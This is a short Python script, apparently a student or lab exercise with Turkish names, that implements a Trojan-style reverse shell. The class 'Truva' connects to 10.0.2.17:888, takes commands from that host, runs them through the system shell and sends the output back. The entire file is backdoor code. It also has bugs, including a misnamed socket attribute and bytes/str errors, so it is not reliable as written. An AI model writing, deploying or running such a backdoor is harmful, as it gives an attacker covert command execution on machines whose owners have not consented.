import socket
import subprocess
import simplejson

class Truva:

    def __init__(self,ip,port):
        self.baglanti = socket.socket(socket.AF_INET,socket.SOCK_STREAM)  #AF_INET6 SOCK_STREAM(tcp) SOCK_DGREAM(udp)

        self.baglanti.connect((ip,port))      #ip adresimiz ve port numarası


    def komut_isleme(self,komut):
        return subprocess.check_output(komut, shell=True)

    def paketleme(self,veri):
        paket = simplejson.dumps(veri)
        self.baglanti.send(paket)

    def paket_coz(self):
        gelen_veri = ""
        while True:
            try:
                gelen_veri = gelen_veri + self.baglan.recv(1024).decode("utf-8")
                return simplejson.loads(gelen_veri)
            except ValueError:
                continue

    def baslatma(self):
        while True:
            komut = self.paket_coz()
            veri = self.komut_isleme(komut)
            self.paketleme(veri)

        self.baglanti.close()


baglanti_kurma = Truva("10.0.2.17",888)
baglanti_kurma.baslatma()

